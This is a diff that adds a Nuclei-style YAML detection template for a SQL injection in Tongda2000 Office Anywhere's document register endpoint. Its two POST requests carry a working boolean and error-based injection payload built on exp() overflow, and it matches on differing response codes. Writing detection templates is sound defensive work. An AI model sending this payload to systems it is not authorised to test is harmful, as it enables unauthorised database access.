@@ -1,0 +1,37 @@
+id: yaml-poc-tongda2000-office_anywhere-sql_injection-CT-530454
+info:
+  name: Yaml Poc Tongda2000 Office_Anywhere Sql_Injection Ct 530454
+  author: guichen.guo
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-tongda2000-office_anywhere-sql_injection-CT-530454'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /general/document/index.php/recv/register/insert
+  body: title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 302
+- method: POST
+  path:
+  - /general/document/index.php/recv/register/insert
+  body: title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: body
+    words:
+    - SQL
